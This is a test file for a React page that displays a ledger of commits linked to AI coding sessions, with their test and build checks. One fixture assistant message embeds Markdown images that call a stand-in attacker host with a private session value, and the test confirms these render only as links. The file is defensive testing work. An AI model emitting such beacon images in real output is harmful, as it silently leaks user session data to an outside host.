import { assert, describe, it } from "@effect/vitest";
import { renderToStaticMarkup } from "react-dom/server";

import type { LedgerRange } from "../core/ledger.ts";

const BEACON = "https://attacker.example/seen?session=private-client";

const range: LedgerRange = {
  repo: "acme/backend",
  range: "main..HEAD",
  remoteUrl: null,
  commits: [
    {
      commit: {
        sha: "a".repeat(40),
        subject: "feat: a",
        committedAt: "2026-01-01T10:00:00Z",
        patchId: null,
      },
      matchedBy: "sha",
      entry: {
        formatVersion: 2,
        commit: {
          sha: "a".repeat(40),
          subject: "feat: a",
          committedAt: "2026-01-01T10:00:00Z",
          patchId: null,
        },
        links: [
          {
            thread: {
              id: "t1",
              title: "Do it",
              source: "codex",
              provider: null,
              origin: null,
              parent: null,
            },
            role: "coder",
            via: "sha",
            reviewedSha: null,
            files: ["src/a.ts"],
            labels: {},
            checks: [
              {
                actionId: "c1",
                turn: "m0",
                at: "2026-01-01T09:58:30Z",
                kind: "test",
                title: "vitest run",
                outcome: "passed",
                basis: "exit code",
                linesAfter: 4,
                scope: ["src/a.ts"],
                testedState: "candidate",
                base: "c".repeat(40),
                applicability: "definitely stale",
                reasons: [
                  "started on cccccccc; the tree was never shown clean",
                  "4 of the commit's lines went into src/a.ts, which it named, after it ran",
                ],
                method: "checks/2",
              },
              {
                actionId: "c2",
                turn: "m0",
                at: "2026-01-01T09:58:40Z",
                kind: "build",
                title: "tsc || true",
                outcome: "unknown",
                basis: "error flag",
                masked: true,
                linesAfter: 0,
                scope: [],
                testedState: "unknown",
                applicability: "unknown",
                reasons: [
                  "the session's starting commit isn't recorded",
                  "nothing shows it ran on this commit, or that it didn't",
                ],
                method: "checks/2",
              },
            ],
            entries: [
              {
                type: "message",
                id: "m0",
                at: "2026-01-01T09:58:00Z",
                role: "user",
                text: "Do it",
              },
              {
                type: "message",
                id: "m1",
                at: "2026-01-01T09:59:00Z",
                role: "assistant",
                text: `Done. ![x](${BEACON}) and ![](${BEACON}&2)`,
              },
            ],
          },
          {
            thread: {
              id: "t2",
              title: "Review it",
              source: "t3",
              provider: "codex",
              origin: null,
              parent: null,
            },
            role: "reviewer",
            via: "asserted",
            reviewedSha: "b".repeat(40),
            files: [],
            labels: {},
            entries: [],
          },
        ],
        unlinked: [],
        files: [
          { path: "src/a.ts", bucket: "attributed" },
          { path: "src/b.css", bucket: "untracked" },
        ],
        notes: [{ text: "b.css by hand", file: "src/b.css", at: "2026-01-01T11:00:00Z" }],
        outputs: "included",
        redactions: 0,
      },
    },
  ],
};

describe("static ledger page", () => {
  it("shows Markdown images in session text as links, so nothing loads by itself", async () => {
    // client.ts builds its API client from `location` on import; the static page never calls it.
    Object.assign(globalThis, { location: { origin: "http://127.0.0.1", hash: "" } });
    const { LedgerPage } = await import("./LedgerPage.tsx");
    const html = renderToStaticMarkup(<LedgerPage data={range} />);
    assert.include(html, "Done.", "the message is rendered");
    assert.notMatch(html, /<img\b/i);
    assert.include(html, `href="${BEACON.replace("&", "&amp;")}"`, "kept as a link to click");
  });

  it("shows every linked thread with its role, stale reviews, file buckets and notes", async () => {
    Object.assign(globalThis, { location: { origin: "http://127.0.0.1", hash: "" } });
    const { LedgerPage } = await import("./LedgerPage.tsx");
    const html = renderToStaticMarkup(<LedgerPage data={range} />);
    for (const text of ["Do it", "Review it", "reviewer", "stale: reviewed bbbbbbbb", "untracked"])
      assert.include(html, text);
    assert.include(html, "b.css by hand");
  });

  it("shows each link's last test and build, what they rest on and what they didn't see", async () => {
    Object.assign(globalThis, { location: { origin: "http://127.0.0.1", hash: "" } });
    const { LedgerPage } = await import("./LedgerPage.tsx");
    const html = renderToStaticMarkup(<LedgerPage data={range} />);
    for (const text of [
      "last test: ✓ passed (exit code) · ran on: candidate · for this commit: definitely stale",
      "4 of the commit&#x27;s lines went into src/a.ts, which it named, after it ran",
      "last build: ? unknown (can&#x27;t fail: || true) · ran on: unknown · for this commit: unknown",
      "2 checks in all: 1 passed, 1 unknown",
    ])
      assert.include(html, text);
  });
});
